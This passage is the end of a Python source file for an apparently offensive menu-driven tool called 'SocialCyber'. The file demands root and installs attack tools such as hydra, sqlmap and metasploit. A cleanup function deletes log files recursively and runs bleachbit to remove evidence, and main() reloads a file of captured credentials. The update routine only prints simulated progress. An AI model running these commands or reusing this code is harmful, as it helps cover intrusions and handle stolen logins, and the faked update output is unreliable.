    os.system("find . -name '*.log' -exec rm -f {} \;")
    os.system("bleachbit -c --preset")
    
    print(f"{Fore.BLUE}│ {Fore.GREEN}[+] System cleaned! Evidence removed")
    print(f"{Fore.BLUE}└───{Fore.GREEN} Cleanup complete! {Fore.BLUE}───{Style.RESET_ALL}")
    input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")

def update_framework():
    """Update or uninstall framework"""
    while True:
        print_banner()
        print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ FRAMEWORK MANAGEMENT ]{Fore.CYAN}─" + "─" * 24 + "┐")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}1.{Fore.CYAN} Check for updates")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}2.{Fore.CYAN} Update framework")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}3.{Fore.CYAN} Install dependencies")
        print(f"{Fore.YELLOW}│ {Fore.GREEN}4.{Fore.CYAN} Uninstall framework")
        print(f"{Fore.YELLOW}│ {Fore.RED}0.{Fore.CYAN} Return to main menu")
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        
        choice = input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Select option: ")
        
        if choice == '0':
            return
        elif choice == '1':
            print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Checking for updates...")
            time.sleep(2)
            print(f"{Fore.GREEN}┌───[ UPDATE INFORMATION ]───")
            print(f"{Fore.GREEN}│ {Fore.YELLOW}Current version: {VERSION}")
            print(f"{Fore.GREEN}│ {Fore.CYAN}Latest version: v5.1")
            print(f"{Fore.GREEN}│ {Fore.RED}Updates available! Security patches and new modules")
            print(f"{Fore.GREEN}└───────────────────────────")
            input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")
        elif choice == '2':
            print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Updating framework...")
            print(f"{Fore.BLUE}┌───{Fore.MAGENTA}[ UPDATE PROGRESS ]{Fore.BLUE}───")
            steps = [
                "Connecting to secure repository",
                "Downloading updates (18.5 MB)",
                "Verifying cryptographic signatures",
                "Applying security patches",
                "Updating attack modules",
                "Optimizing performance",
                "Cleaning temporary files"
            ]
            
            for i, step in enumerate(steps):
                time.sleep(0.5)
                print(f"{Fore.BLUE}│ {Fore.YELLOW}[{i+1}/{len(steps)}] {step}...")
            
            print(f"{Fore.BLUE}│ {Fore.GREEN}Framework successfully updated to v5.1!")
            print(f"{Fore.BLUE}└───{Fore.GREEN} Update complete! {Fore.BLUE}───{Style.RESET_ALL}")
            input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")
        elif choice == '3':
            print(f"\n{Fore.YELLOW}[{Fore.CYAN}*{Fore.YELLOW}] Installing dependencies...")
            run_command("sudo apt update && sudo apt install -y nmap hydra sqlmap aircrack-ng metasploit-framework theharvester", None)
            print(f"{Fore.GREEN}[+] Dependencies installed successfully!")
            input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Press Enter to continue...")
        elif choice == '4':
            confirm = input(f"\n{Fore.RED}[!] Are you sure you want to uninstall? (y/N): ")
            if confirm.lower() == 'y':
                print(f"{Fore.RED}Uninstalling framework...")
                print(f"{Fore.BLUE}┌───{Fore.RED}[ UNINSTALL PROGRESS ]{Fore.BLUE}───")
                steps = [
                    "Removing core files",
                    "Deleting configuration data",
                    "Cleaning installation directories",
                    "Removing system integrations",
                    "Securely wiping traces",
                    "Finalizing uninstallation"
                ]
                
                for i, step in enumerate(steps):
                    time.sleep(0.6)
                    print(f"{Fore.BLUE}│ {Fore.YELLOW}[{i+1}/{len(steps)}] {step}...")
                
                print(f"{Fore.BLUE}│ {Fore.GREEN}Framework successfully uninstalled!")
                print(f"{Fore.BLUE}└───────────────────────────────────")
                print(f"\n{Fore.YELLOW}Thank you for using SocialCyber. Goodbye!")
                time.sleep(2)
                sys.exit(0)
        else:
            print(f"{Fore.RED}Invalid selection!")

def main():
    """Main program loop"""
    # Load existing credentials if available
    global captured_credentials
    if os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, "r") as f:
            for line in f:
                if "Captured credentials" in line:
                    continue
                captured_credentials.append(line.strip())
    
    # Check if running on Kali Linux
    if "kali" not in platform.platform().lower():
        print(f"{Fore.YELLOW}[{Fore.RED}!{Fore.YELLOW}] Warning: Not running on Kali Linux. Some tools may not work properly.")
        time.sleep(2)
    
    while True:
        print_banner()
        
        # Print main menu in 2 columns
        col1 = MAIN_MENU[:len(MAIN_MENU)//2]
        col2 = MAIN_MENU[len(MAIN_MENU)//2:]
        
        print(f"{Fore.CYAN}┌──{Fore.MAGENTA}[ MAIN MENU ]{Fore.CYAN}─" + "─" * 36 + "┐")
        
        # Print menu items in two columns
        for i in range(len(col1)):
            # Left column item
            left_num = i+1
            left_item = f"{Fore.GREEN}{left_num:2d}.{Fore.CYAN} {col1[i][0]}"
            
            # Right column item (if exists)
            right_item = ""
            if i < len(col2):
                right_num = i+1+len(col1)
                right_item = f"{Fore.GREEN}{right_num:2d}.{Fore.CYAN} {col2[i][0]}"
            
            print(f"{Fore.YELLOW}│ {left_item.ljust(25)}{Fore.YELLOW}│ {right_item}")
        
        print(Fore.YELLOW + "└" + "─" * 50 + "┘")
        
        # Get user selection
        try:
            choice = input(f"\n{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}] Select module (1-{len(MAIN_MENU)}) or {Fore.RED}0{Fore.YELLOW} to exit: ")
            if choice == '0':
                print(f"\n{Fore.YELLOW}Exiting SocialCyber. Goodbye!")
                time.sleep(1)
                sys.exit(0)
            
            choice = int(choice)
            if 1 <= choice <= len(MAIN_MENU):
                module = MAIN_MENU[choice-1][1]
                if module == "exit":
                    sys.exit(0)
                elif module == "view_creds":
                    view_credentials()
                elif module == "sessions":
                    view_sessions()
                elif module == "cleaner":
                    clean_system()
                elif module == "update":
                    update_framework()
                else:
                    show_module(module)
        except ValueError:
            print(f"{Fore.RED}Invalid input! Please enter a number.")
            time.sleep(1)

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print(f"{Fore.RED}This tool requires root privileges. Please run with sudo!")
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}\n[!] Operation cancelled by user. Exiting...")
        sys.exit(0)
